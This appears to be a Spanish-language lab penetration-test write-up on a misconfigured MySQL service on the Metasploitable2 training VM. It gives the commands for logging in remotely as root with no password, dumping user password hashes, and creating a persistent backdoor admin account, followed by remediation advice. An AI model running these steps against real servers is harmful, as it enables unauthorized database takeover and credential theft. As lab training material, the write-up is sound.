# ✅ Explotación del Servicio MySQL (Puerto 3306)

## 🔹 Visión General

Durante la evaluación del objetivo **Metasploitable2**, se identificó que el servicio **MySQL** que se ejecuta en el puerto **3306** estaba **críticamente mal configurado**. El servidor de bases de datos permite la **autenticación remota como `root` sin contraseña**, lo que otorga control total sobre todas las bases de datos y la capacidad de crear cuentas persistentes tipo backdoor.

---

## 🔹 1. Enumeración del Servicio

### ✅ Escaneo de Puertos

```bash
nmap -p3306 -sV 192.168.56.101
```

**Resultado:**

```text
Service: MySQL
Version: 5.0.51a-3ubuntu5
Remote connections: Enabled
SSL/TLS: Not enforced
```

Esta versión está **obsoleta** y carece de mecanismos de seguridad modernos.

---

## 🔹 2. Inicio de Sesión Remoto sin Contraseña

Los intentos iniciales de conexión fallaron debido a errores de negociación SSL. Sin embargo, al deshabilitar SSL se obtuvo acceso:

```bash
mysql -h 192.168.56.101 -u root --skip-ssl
```

✅ El inicio de sesión fue exitoso **sin contraseña**, confirmando una vulnerabilidad crítica de autenticación.

---

## 🔹 3. Enumeración de Bases de Datos

Una vez autenticado, todas las bases de datos del servidor eran accesibles:

```sql
SHOW DATABASES;
```

**Bases de datos descubiertas:**

```text
information_schema
dvwa
metasploit
mysql
owasp10
tikiwiki
tikiwiki195
```

Estas bases de datos contienen información potencialmente sensible de aplicaciones y credenciales.

---

## 🔹 4. Enumeración de Usuarios y Privilegios

Se enumeraron los usuarios de MySQL:

```sql
SELECT host, user, password FROM mysql.user;
```

**Hallazgos clave:**

* Existe el usuario **root@%** sin contraseña.
* El host `%` permite el inicio de sesión desde **cualquier IP remota**.
* También está presente una cuenta **guest@%**.

La inspección de privilegios confirmó acceso total:

```sql
SHOW GRANTS FOR 'root'@'%';
```

**Resultado:**

```text
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
```

✅ El atacante tiene **control irrestricto** sobre todas las bases de datos.

---

## 🔹 5. Persistencia Mediante Cuenta Backdoor

Para demostrar el impacto, se creó un nuevo usuario controlado por el atacante:

```sql
CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned123';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

✅ Esto proporciona un **punto de acceso persistente**, incluso si posteriormente se asegura la cuenta root.

---

## 🔹 6. Notas de Explotación

* Las versiones modernas de **Metasploit** ya no incluyen el módulo `mysql_udf_payload`, por lo que no fue posible obtener RCE directo mediante UDF.
* No obstante, el nivel de acceso alcanzado ya constituye un **compromiso total** desde el punto de vista de la seguridad de los datos.

---

## 🔹 7. Evaluación de Impacto

**Severidad:** Crítica

Un atacante puede:

* Acceder, modificar o eliminar todos los datos
* Extraer credenciales almacenadas en bases de datos de aplicaciones
* Crear cuentas privilegiadas
* Comprometer aplicaciones conectadas (DVWA, TikiWiki, etc.)
* Potencialmente pivotar hacia la explotación a nivel de sistema

Esto representa una **violación total de la confidencialidad, integridad y disponibilidad** de la base de datos.

---

## 🔹 8. Recomendaciones de Remediación

* Establecer contraseñas fuertes para todas las cuentas MySQL
* Eliminar el acceso remoto de `root@%`
* Deshabilitar el acceso remoto si no es necesario
* Forzar el uso de **SSL/TLS**
* Actualizar MySQL a una versión soportada
* Eliminar cuentas no utilizadas como `guest`

---

## ✅ Conclusión

El servicio **MySQL en el puerto 3306** se encontró **críticamente vulnerable** debido a la posibilidad de inicio de sesión remoto como root sin autenticación, la falta de contraseñas y la concesión de privilegios irrestrictos. Esta mala configuración permite la toma completa del control de las bases de datos y la persistencia a largo plazo, convirtiéndose en uno de los hallazgos más graves de toda la evaluación de seguridad.


